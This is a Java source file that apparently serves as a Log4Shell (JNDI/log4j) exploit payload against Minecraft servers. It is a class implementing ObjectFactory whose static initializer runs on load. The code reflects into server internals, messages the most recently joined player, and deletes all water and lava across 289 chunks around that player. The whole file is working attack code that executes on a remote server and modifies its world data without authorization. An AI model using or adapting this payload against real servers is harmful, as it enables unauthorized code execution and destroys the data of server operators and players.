import net.minecraft.block.Block;
import net.minecraft.block.BlockDynamicLiquid;
import net.minecraft.block.BlockStaticLiquid;
import net.minecraft.block.state.IBlockState;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ServerCommandManager;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.init.Blocks;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.management.PlayerChunkMapEntry;
import net.minecraft.util.math.ChunkPos;
import net.minecraft.util.text.ChatType;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.world.chunk.Chunk;
import net.minecraft.world.chunk.storage.ExtendedBlockStorage;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.concurrent.Callable;

public class PartTheSeas implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            Field managerF = CommandBase.class.getDeclaredField("a");
            managerF.setAccessible(true);
            ServerCommandManager manager = (ServerCommandManager)managerF.get(null);
            Field serverF = ServerCommandManager.class.getDeclaredField("a");
            serverF.setAccessible(true);
            MinecraftServer server = (MinecraftServer)serverF.get(manager);

            int lastIndex = server.getPlayerList().getPlayerList().size()-1;
            if (lastIndex == -1) {
                return null;
            }
            EntityPlayerMP me = server.getPlayerList().getPlayerList().get(lastIndex);

            //EntityPlayerMP me = server.getPlayerList().getPlayerByUsername("Captain_S0L0");

            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nMOSES SAYS HELLO\u00a75\u00a7k-|-"), ChatType.SYSTEM));
                ChunkPos origin = new ChunkPos(me.getPosition());
                for (int x = -8; x <= 8; x++) {
                    for (int z = -8; z <= 8; z++) {
                        Chunk chunk = me.getServerWorld().getChunkFromChunkCoords(origin.chunkXPos+x, origin.chunkZPos+z);

                        for (ExtendedBlockStorage storage : chunk.getBlockStorageArray()) {
                            if (storage == null || storage.isEmpty()) {
                                continue;
                            }

                            for (int cx = 0; cx < 16; cx++) {
                                for (int cy = 0; cy < 16; cy++) {
                                    for (int cz = 0; cz < 16; cz++) {
                                        IBlockState s = storage.get(cx, cy, cz);
                                        if (s == null) {
                                            continue;
                                        }
                                        Block b = s.getBlock();
                                        if (b instanceof BlockStaticLiquid || b instanceof BlockDynamicLiquid) {
                                            storage.set(cx, cy, cz, Blocks.AIR.getDefaultState());
                                        }
                                    }
                                }
                            }
                        }

                        chunk.setChunkModified();
                        PlayerChunkMapEntry entry = me.getServerWorld().getPlayerChunkMap().getEntry(chunk.xPosition, chunk.zPosition);

                        Field bool = PlayerChunkMapEntry.class.getDeclaredField("j");
                        bool.setAccessible(true);
                        bool.setBoolean(entry, false);

                        entry.sendToPlayers();

                    }
                }
            }

            server.currentTask = null;
            return null;
        };

        Thread thread = new Thread(() -> {
            try {
                Field managerF = CommandBase.class.getDeclaredField("a");
                managerF.setAccessible(true);
                ServerCommandManager manager = (ServerCommandManager) managerF.get(null);
                Field serverF = ServerCommandManager.class.getDeclaredField("a");
                serverF.setAccessible(true);
                MinecraftServer server = (MinecraftServer) serverF.get(manager);

                if (server == null || !server.isServerRunning() || (server.currentTask != null && server.currentTask.equals("log4j"))) {
                    return;
                }
                server.currentTask = "log4j";
                server.callFromMainThread(submitToMain);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        });
        thread.start();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}
